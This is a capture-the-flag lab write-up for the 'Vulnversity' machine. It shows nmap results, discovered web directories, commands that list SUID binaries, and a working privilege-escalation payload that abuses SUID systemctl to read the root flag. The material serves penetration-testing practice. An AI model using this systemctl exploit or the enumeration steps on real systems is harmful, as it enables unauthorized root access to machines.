# Vulnversity

## namp -sV -vv
open ports -> 21, 22, 139, 445,  3128, 3333


## nmap -sV -vv -Pn

PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  syn-ack ttl 63 Squid http proxy 3.5.12
3333/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel



## DIRECTORY BRUTEFORCE

- //
- /css
- /fonts
- /images
- <b>/internal</b>
- /js


## PRIVILIGE ESCALATION
=======================
### 1. Find Binaries having SUID Permission
---------------------------------------------------
#### find / -user root -perm -4000 -exec ls -ldb {} \;
or,
#### find / -perm -u=s -type f 2>/dev/null

- <b>/</b> denotes  start from the top (root) of the file system and find every directory
- <b>-perm</b> denotes search for the permissions that follow
- <b>-u=s</b> denotes look for files that are owned by the root user
- <b>-type</b> states the type of file we are looking for
- <b>f</b> denotes a regular file, not the directories or special files
- <b>2</b> denotes to the second file descriptor of the process, i.e. stderr (standard error)
- <b>\></b> means redirection 
- <b>/dev/null</b> is a special filesystem object that throws away everything written into it.

#### find / -perm -u=s -type f 2>/dev/null

- /usr/bin/newuidmap
- /usr/bin/chfn
- /usr/bin/newgidmap
- /usr/bin/sudo
- /usr/bin/chsh
- /usr/bin/passwd
- /usr/bin/pkexec
- /usr/bin/newgrp
- /usr/bin/gpasswd
- /usr/bin/at
- /usr/lib/snapd/snap-confine
- /usr/lib/policykit-1/polkit-agent-helper-1
- /usr/lib/openssh/ssh-keysign
- /usr/lib/eject/dmcrypt-get-device
- /usr/lib/squid/pinger
- /usr/lib/dbus-1.0/dbus-daemon-launch-helper
- /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
- /bin/su
- /bin/ntfs-3g
- /bin/mount
- /bin/ping6
- /bin/umount
- /bin/systemctl
- /bin/ping
- /bin/fusermount
- /sbin/mount.cifs



### 2. Exploit SUID Enabled systemctl
---------------------------------------
eop=$(mktemp).service
echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $eop
/bin/systemctl link $eop
/bin/systemctl enable --now $eop


